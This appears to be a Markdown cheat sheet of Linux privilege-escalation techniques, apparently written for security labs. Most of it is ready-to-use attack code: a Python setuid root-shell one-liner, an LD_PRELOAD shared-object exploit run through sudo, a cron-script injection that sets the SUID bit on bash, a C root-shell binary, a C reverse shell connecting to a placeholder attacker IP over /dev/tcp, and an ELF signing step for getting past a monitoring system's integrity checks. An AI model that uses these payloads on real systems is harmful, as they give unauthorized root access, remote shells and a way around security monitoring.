##  Privilege Escalation via Python

```python
python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

> Spawns a root shell if the script is run with root privileges.

---

##  LD\_PRELOAD + sudo

### 🔹 Exploit example

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run_me_first() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

**Compile:**

```bash
gcc -fPIC -shared -o exploit.so exploit.c
```

**Run:**

```bash
sudo LD_PRELOAD=./exploit.so /usr/bin/ping
```

---

##  Crontab 

###  🔹Where to look:

- `/etc/crontab`
- `/etc/cron.*/*`
- Systemd timers (`systemctl list-timers`)

###  🔹Exploitation Steps:

1. **Identify a writable target**:

   - Check if you can edit a script or file executed by the cronjob.

2. **Inject malicious code**:

   - For example, add a reverse shell or privilege escalation payload to the script:
     ```bash
     #!/bin/bash
     chmod u+s /bin/bash
     ```
   - This will set the SUID bit on `/bin/bash`, allowing root shell access with:
     ```bash
     /bin/bash -p
     ```

3. **Wait for the cronjob to run** — Check the timing configuration of the cronjob. Crontab lines follow this format:

```
# ┌───────────── minute (0 - 59)
# │ ┌───────────── hour (0 - 23)
# │ │ ┌───────────── day of month (1 - 31)
# │ │ │ ┌───────────── month (1 - 12)
# │ │ │ │ ┌───────────── day of week (0 - 7) (Sunday is 0 or 7)
# │ │ │ │ │
# * * * * *  user-name  command-to-be-executed
```
---

##  Crontab → SUID bash

```python
os.system('chmod u+s /bin/bash')
```

Then:

```bash
/bin/bash -p
```

> Runs bash with root privileges if the SUID bit is set.

---

##  SUID via C binary

```c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

> Compiles a binary that spawns a root shell when executed by a script with SUID. Look [[UID]] for more details

---

## Reverse Shell via C binary 

```c
#include <unistd.h>
int main() {
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1", NULL);
    return 0;
}
```

> Compiles a binary that spawns a  reverse shell on port 1337 when executed by a root srcipt like cronjob (RUID = 0)

---
## ELF Signing Tool

To bypass signature verification by the monitoring system, we signed the ELF binary using:

🔗 [linux-elf-binary-signer GitHub repository](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)

Sign the binary with:
```bash
./elf-sign sha256 key.pem key.pem monitor
```

This generates a signed ELF executable that passes integrity checks during the scan.
